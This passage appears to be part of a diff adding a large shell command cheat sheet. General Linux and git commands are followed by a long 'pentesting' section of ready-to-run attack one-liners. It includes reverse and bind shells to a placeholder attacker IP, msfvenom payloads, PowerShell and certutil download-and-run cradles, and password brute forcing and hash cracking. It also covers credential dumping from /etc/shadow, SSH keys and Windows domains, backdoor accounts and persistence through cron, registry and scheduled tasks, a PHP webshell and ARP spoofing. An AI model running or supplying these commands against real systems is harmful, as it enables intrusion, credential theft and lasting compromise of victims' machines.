+scp user@remote:/tmp/file.txt . # Copy from remote
+rsync -avz /src/ user@remote:/dest/ # Remote sync
+rsync -avz --delete /src/ user@remote:/dest/ # Delete extraneous files
+rsync -avz --exclude='*.log' /src/ /dest/ # Exclude patterns
+git clone https://github.com/user/repo.git # Clone repo
+git status # Repo status
+git add -A # Stage all
+git add file.txt # Stage specific file
+git commit -m "message" # Commit
+git push origin main # Push commits
+git pull origin main # Pull changes
+git log --oneline # Compact history
+git log --graph --oneline --all # Graph view
+git diff # Show unstaged changes
+git diff --staged # Show staged changes
+git branch # List branches
+git checkout -b new-branch # Create and switch
+git merge branch-name # Merge branch
+sudo -i # Become root
+sudo -u user command # Run as another user
+su - # Switch to root (needs password)
+crontab -e # Edit cron jobs
+crontab -l # List cron jobs
+crontab -r # Remove cron jobs
+systemd-analyze # Boot performance analysis
+systemd-analyze blame # List slow services
+env # Show environment variables
+export VAR=value # Set environment variable
+echo $VAR # Print variable
+unset VAR # Remove variable
+set -o # Show shell options
+shopt # Bash shell options (bash only)
+seq 1 10 # Generate sequence
+shuf file.txt # Shuffle lines
+shuf -n 5 file.txt # Random 5 lines
+comm file1 file2 # Compare sorted files
+join file1 file2 # Join on common field
+nl file.txt # Number lines
+factor 100 # Prime factors
+expr 5 + 3 # Arithmetic
+bc <<< "scale=2; 10/3" # Calculator
+# Loop over files
+for f in *.txt; do echo "Processing $f"; done
+# While read line
+while read line; do echo $line; done < file.txt
+# Counter loop
+for i in {1..10}; do echo $i; done
+# Infinite loop with break
+while true; do echo "running"; sleep 1; done
+
+# ============================================
+# PENTESTING / ETHICAL HACKING (300 commands)
+# ============================================
+nmap -sV -sC -p- -oA scan target.com # Full port & service scan
+nmap -sS -Pn target.com # Stealth SYN scan, no ping
+nmap -sU --top-ports 20 target.com # Top UDP ports
+nmap --script vuln target.com # Vulnerability scan
+nmap --script=smb-os-discovery target.com # SMB OS discovery
+nmap -p 80,443,22 --script http-enum,ssl-heartbleed target.com # Specific scripts
+nmap -sn 192.168.1.0/24 # Ping sweep
+nmap -sC -sV -T4 -oA quick target.com # Quick default scan
+masscan -p1-65535 --rate=1000 192.168.1.0/24 # Fast port scan
+masscan -p80,443,22 -oL output.txt target.com # Output in list format
+rustscan -a target.com --range 1-65535 -- -sV # Port scan + nmap version
+nc -nv target.com 80 # Connect to port
+nc -lvnp 4444 # Simple reverse shell listener
+nc -e /bin/bash 10.10.10.10 4444 # Netcat bind shell (if -e available)
+ncat -lvnp 4444 --ssl # Encrypted listener
+socat TCP-LISTEN:4444,fork EXEC:/bin/bash # Socat reverse shell
+socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork EXEC:/bin/bash # SSL socat
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt # Directory brute force
+gobuster dir -u http://target.com -w rockyou.txt -x php,html,txt # File extensions
+gobuster dns -d target.com -w subdomains.txt # Subdomain enumeration
+gobuster vhost -u http://target.com -w subdomains.txt # Virtual host discovery
+ffuf -u http://target.com/FUZZ -w wordlist.txt # Web fuzzer
+ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404 # Filter code 404
+ffuf -u http://target.com/FUZZ -w wordlist.txt -mr "error" # Match regex
+dirb http://target.com /usr/share/wordlists/dirb/common.txt # Directory brute force
+dirb http://target.com -X .php,.txt # Extensions
+dirsearch -u http://target.com -e php,html,txt # Advanced directory search
+dirsearch -u http://target.com -w custom.txt -r # Recursive
+nikto -h http://target.com -ssl # Web server scanner
+nikto -h http://target.com -Tuning x 9 # Tuning options (SQL, XSS)
+wpscan --url http://target.com --enumerate p,t,u # WordPress scan
+wpscan --url http://target.com --api-token TOKEN # With vulnerability DB
+wpscan --url http://target.com --password-attack xmlrpc -U admin -P rockyou.txt # Bruteforce
+sqlmap -u "http://target.com/page?id=1" --dbs # SQL injection, list databases
+sqlmap -u "http://target.com/page?id=1" -D dbname --tables # List tables
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump # Dump table
+sqlmap -r request.txt --batch --dbs # Using request file
+sqlmap --os-shell --data="id=1" -u https://target.com/page # Attempt OS shell
+sqlmap --level 5 --risk 3 -u "http://target.com/page?id=1" # Aggressive test
+hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" # Web login brute
+hydra -L users.txt -P pass.txt ssh://target.com # SSH brute force
+hydra -l admin -P pass.txt smtp://target.com -V # SMTP brute
+hydra -l admin -P pass.txt rdp://target.com # RDP brute
+hashcat -m 0 -a 0 hash.txt rockyou.txt # MD5 dictionary attack
+hashcat -m 1000 -a 0 ntlm.hash rockyou.txt # NTLM hash
+hashcat -m 1800 -a 3 ?l?l?l?l?l?l?l?l # SHA-512LM mask attack (8 lowercase)
+hashcat -m 5600 -a 0 netntlmv2.hash rockyou.txt # NetNTLMv2
+john --wordlist=rockyou.txt hashes.txt # John the Ripper
+john --format=md5 --wordlist=rockyou.txt hash.txt # Specify format
+john --show hash.txt # Show cracked passwords
+unshadow /etc/passwd /etc/shadow > unshadowed.txt # Prepare for John
+john --single --format=nt unshadowed.txt # Single crack mode
+crackmapexec smb 192.168.1.0/24 # CME scanning SMB
+crackmapexec smb target.com -u user -p pass --shares # List shares
+crackmapexec winrm target.com -u user -p pass -x "whoami" # Execute via WinRM
+crackmapexec mssql target.com -u sa -p pass -q "SELECT @@version" # MSSQL query
+crackmapexec ssh target.com -u root -p pass -x "id" # SSH command
+smbclient -L target.com -N # List SMB shares
+smbclient //target.com/share -U user # Connect to share
+smbclient //target.com/ipc$ -U "" -N # Null session
+enum4linux -a target.com # Enumerate Windows/Samba
+enum4linux -U target.com # Users only
+enum4linux -S target.com # Shares only
+rpcclient -U "" target.com -c "srvinfo" # Null session RPC
+rpcclient -U user%pass target.com -c "enumdomusers" # Enumerate domain users
+impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat # ASREP-roasting
+impacket-GetUserSPNs domain.local/user:pass -request # Kerberoasting
+impacket-secretsdump domain.local/user:pass@target.com # Dump SAM/LSA
+impacket-secretsdump -just-dc-ntlm domain.local/user:pass@target.com # NTDS dump
+impacket-psexec domain.local/user:pass@target.com # Remote command execution
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:hash domain.local/user@target.com # Pass-the-hash
+impacket-wmiexec domain.local/user:pass@target.com # WMI exec
+impacket-smbexec domain.local/user:pass@target.com # SMB exec
+impacket-atexec domain.local/user:pass@target.com "whoami" # Task scheduler exec
+msfconsole -q # Start Metasploit console
+msfconsole -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run" # Run from command line
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe # Generate exe payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf # Linux payload
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php # PHP payload
+msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f macho -o shell.macho # macOS payload
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.jsp # JSP payload
+searchsploit apache 2.4 # Search Exploit-DB
+searchsploit -m 12345 # Mirror exploit to current directory
+searchsploit -t linux kernel 5.4 # Title search
+searchsploit -c "remote" # Case-insensitive search
+curl -X PUT -d @file.txt http://target.com/upload # PUT file upload
+curl -X POST -H "Content-Type: application/json" -d '{"cmd":"id"}' http://target.com/api # JSON command injection
+curl -k https://target.com # Ignore SSL errors
+curl -X DELETE http://target.com/api/user/1 # Try DELETE method
+curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin # IP spoofing
+wget --post-data="user=admin&pass=admin" http://target.com/login # POST via wget
+wget --header="User-Agent: MyHacker" http://target.com # Custom header
+dig axfr @ns1.target.com target.com # Zone transfer attempt
+dig +short target.com # Simple query
+dnsrecon -d target.com # DNS reconnaissance
+dnsrecon -d target.com -t brt -D subdomains.txt # Brute force subdomains
+dnsenum target.com # Enumerate DNS
+dnsenum -f subdomains.txt -r target.com # With wordlist
+whois target.com # WHOIS lookup
+whois -h whois.arin.net 8.8.8.8 # IP WHOIS
+theHarvester -d target.com -b google,linkedin # Email harvesting
+theHarvester -d target.com -b all -f results.html # All sources
+snmpwalk -v2c -c public target.com # SNMP enumeration
+snmpwalk -v1 -c private target.com # SNMPv1
+onesixtyone -c community.txt target.com # SNMP community brute
+snmpenum -v2c -c public target.com # Advanced SNMP enumeration
+cewl http://target.com -w wordlist.txt # CeWL wordlist from website
+cewl -d 3 -m 5 http://target.com # Depth 3, min length 5
+crunch 8 8 0123456789 -o numlist.txt # Generate number wordlist (8 digit)
+crunch 6 6 abc123 -o wordlist.txt # Mixed characters
+rsmangler --file wordlist.txt --output mangled.txt # Wordlist mangling
+john --wordlist=rockyou.txt --rules=best64 hashes.txt # John with rules
+hash-identifier # Identify hash type (interactive)
+hashid hash.txt # Command line hash identification
+weevely generate password shell.php # Generate PHP webshell
+weevely http://target.com/shell.php password # Connect to webshell
+weevely session http://target.com/shell.php password # Reconnect
+proxychains nmap -sT -Pn target.com # Use proxychains for scanning
+proxychains firefox # Launch browser through proxy
+ssh -D 1080 user@target.com # Dynamic SSH tunneling (SOCKS)
+ssh -L 8080:internal:80 user@jump-host # Local port forward
+ssh -R 4444:localhost:22 user@target.com # Remote port forward
+ssh -C -D 1080 user@target.com # Compression + SOCKS
+plink -R 3389:localhost:3389 user@target.com # RDP tunnel via Plink (Windows)
+plink -ssh -D 1080 user@target.com # SOCKS on Windows
+chisel server -p 8000 --reverse # Chisel reverse tunnel server
+chisel client 10.10.10.10:8000 R:8080:localhost:80 # Chisel client reverse
+chisel server -p 8000 --socks5 # SOCKS5 proxy server
+python3 -c 'import pty; pty.spawn("/bin/bash")' # Upgrade shell to TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm; stty sane # Full TTY upgrade
+script /dev/null -c bash # Alternative TTY upgrade (Linux)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444 # Socat reverse shell proper
+socat file:`tty`,raw,echo=0 tcp:10.10.10.10:4444 # Connect to socat listener
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg # Embed PHP in image
+exiftool -Artist='<script>alert(1)</script>' image.jpg # XSS in metadata
+binwalk -e firmware.bin # Extract firmware
+binwalk --dd=".*" firmware.bin # Extract all file types
+steghide extract -sf image.jpg # Extract hidden data
+steghide embed -cf cover.jpg -ef secret.txt # Embed file
+steghide info image.jpg # Check if contains data
+tcpdump -i eth0 -w capture.pcap # Capture traffic
+tcpdump -i eth0 port 80 -A # HTTP traffic sniffing (ASCII)
+tcpdump -i eth0 host 10.10.10.10 -vv # Verbose for specific host
+tcpdump -r capture.pcap -n # Read capture without DNS resolution
+tshark -i eth0 -Y "http.request" # Filter HTTP requests
+tshark -r capture.pcap -T fields -e ip.src -e ip.dst # Extract fields
+tshark -i eth0 -f "tcp port 80" -c 100 # Capture 100 packets
+bettercap -iface eth0 # MITM framework
+bettercap -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on" # Spoof and sniff
+aircrack-ng -w rockyou.txt -b BSSID capture.cap # Crack WPA handshake
+aircrack-ng -b BSSID -e ESSID capture.cap # Use ESSID
+aircrack-ng -J hash.hccapx capture.cap # Convert to Hashcat format
+reaver -i wlan0mon -b BSSID -vv # WPS brute force
+reaver -i wlan0mon -b BSSID -c 6 -K 1 # Known PIN attack
+wifite -i wlan0mon # Automated wireless attack
+wifite --wps-only # Only WPS attacks
+evil-winrm -i target.com -u Administrator -p password # WinRM shell
+evil-winrm -i target.com -u Administrator -H hash # Pass-the-hash WinRM
+evil-winrm -i target.com -S -k key.pem -c cert.pem # SSL with certificate
+xfreerdp /u:administrator /p:password /v:target.com /w:1920 /h:1080 # RDP connect
+xfreerdp /u:administrator /p:password /v:target.com /drive:linux,/home/user # Mount drive
+rdesktop target.com # Older RDP client
+rdesktop -u administrator -p password -g 1024x768 target.com # With geometry
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/powercat.ps1')" # IEX cradle
+powershell -enc base64encodedcommand # Encoded PowerShell command
+certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe # Download with certutil (Windows)
+wget -O shell.exe http://10.10.10.10/shell.exe # Linux download
+curl -o shell.exe http://10.10.10.10/shell.exe # Linux download alternate
+mshta.exe javascript:execute("new ActiveXObject('WScript.Shell').Run('calc')") # HTA attack vector
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v malicious /t REG_SZ /d "C:\mal.exe" /f # Persistence via registry
+schtasks /create /tn "Malicious" /tr "C:\mal.exe" /sc daily /st 09:00 # Scheduled task persistence
+sc create MalService binpath= "C:\mal.exe" start= auto # Service persistence
+net user hacker P@ssw0rd /add # Create local user (Windows)
+net localgroup administrators hacker /add # Add to administrators
+useradd -m hacker -s /bin/bash # Create Linux user
+echo "hacker:password" | chpasswd # Set password
+usermod -aG sudo hacker # Add to sudo
+echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers # Passwordless sudo (dangerous)
+crontab -l > cron ; echo "*/5 * * * * /tmp/backdoor.sh" >> cron ; crontab cron # Persistence via cron
+echo "0 * * * * root /tmp/backdoor" >> /etc/crontab # System-wide cron
+nohup ./backdoor & # Run in background
+disown # Detach from shell
+screen -dmS session bash # Run in detached screen
+tmux new -d -s mysession 'bash' # Run in detached tmux
+cat /etc/passwd # List users
+cat /etc/shadow # Hashed passwords (root required)
+cat /etc/hosts # Hosts file
+cat /etc/resolv.conf # DNS config
+cat ~/.bash_history # Command history
+cat ~/.ssh/id_rsa # Private key (if exists)
+cat /etc/nginx/nginx.conf # Nginx config
+cat /etc/apache2/apache2.conf # Apache config
+cat /etc/my.cnf # MySQL config
+cat /var/www/html/config.php # PHP config with DB creds
+find / -name "wp-config.php" 2>/dev/null # Find WordPress config
+grep -r "DB_PASSWORD" /var/www/ 2>/dev/null # Search for DB password
+ls -la /tmp # Check world-writable tmp
+ls -la /dev/shm # Shared memory
+find / -perm -4000 2>/dev/null # SUID binaries
+find / -perm -2000 2>/dev/null # SGID binaries
+ps aux | grep root # Running processes as root
+sudo -l # List allowed sudo commands
+linpeas.sh # Linux privilege escalation auditor (download and run)
+winpeas.exe # Windows privilege escalation auditor
+linux-smart-enumeration # lse script
+pspy -p # Process monitoring (no root)
+uname -a # Kernel version
+cat /etc/os-release # OS version
+sysctl -a # Kernel parameters
+getcap -r / 2>/dev/null # Capabilities
+lsof -i # Open files with network
+ss -lntp # Listening TCP sockets
+netstat -anp # All connections
+iptables -L # Firewall rules
